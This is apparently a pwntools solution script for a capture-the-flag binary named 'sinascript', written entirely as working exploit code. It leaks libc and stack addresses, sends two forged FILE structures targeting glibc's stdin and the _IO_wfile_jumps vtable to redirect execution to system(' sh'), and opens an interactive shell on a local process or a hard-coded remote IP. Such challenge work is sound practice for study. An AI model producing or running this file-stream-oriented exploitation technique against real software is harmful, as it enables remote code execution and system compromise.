from pwn import *
import base64

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("sinascript")
libc = ELF("libc.so.6")

EXPLOIT_FILE = "exploit.ss"

with open(EXPLOIT_FILE, "rb") as f:
	ss_exploit = f.read()

if args.REMOTE:
#	p = remote("127.0.0.1", 5000)
	p = remote("65.109.185.145", 5000)
	p.sendlineafter(b"input: ", base64.b64encode(ss_exploit))
	if args.GDB:
		pause()
else:
	if args.GDB:
		p = gdb.debug(["./sinascript", EXPLOIT_FILE])
		pause()
	else:
		p = elf.process([EXPLOIT_FILE])
		# gdb.attach(p)
		# pause()

p.recvuntil(b"libcLeak: ")
libc.address = int(p.recvline())
log.success("libc base = " + hex(libc.address))
p.recvuntil(b"stackLeak: ")
stack_leak = int(p.recvline())
log.success("stack argv strings @ " + hex(stack_leak))

stdin = libc.sym["_IO_2_1_stdin_"]

fsop = p64(0xfbad208b) + p64(libc.address)
fsop += p64(0) * 5
fsop += p64(stdin) + p64(stdin+0x200)

p.sendafter(b"1234", fsop)

fsop2 = b" sh".ljust(8, b"\0") + p64(libc.address)
fsop2 += p64(0) * 3 + p64(1) + p64(0) * 11
fsop2 += p64(stdin + 0x100) + p64(0) * 2
fsop2 += p64(stdin)
fsop2 = fsop2.ljust(0xd0, b"\0")
fsop2 += p64(libc.sym["system"])
fsop2 += p64(libc.sym["_IO_wfile_jumps"])
fsop2 += p64(stdin + 0xd0 - 0x68)

p.sendafter(b"1234", fsop2)

p.interactive()
